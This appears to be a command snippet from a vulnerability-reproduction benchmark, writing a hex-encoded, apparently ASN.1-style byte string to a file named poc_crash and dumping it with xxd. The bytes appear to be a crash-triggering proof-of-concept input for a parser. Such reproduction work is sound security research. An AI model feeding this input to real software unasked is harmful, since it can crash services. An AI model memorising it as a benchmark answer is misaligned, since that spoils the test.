python3 -c "
import binascii
d=binascii.unhexlify('a016300030080401010303020400a0083006300404023f00')
open('/CybinGym_workdir/poc_crash','wb').write(d)
print('wrote', len(d), 'bytes:', d.hex())
"
xxd /CybinGym_workdir/poc_crash
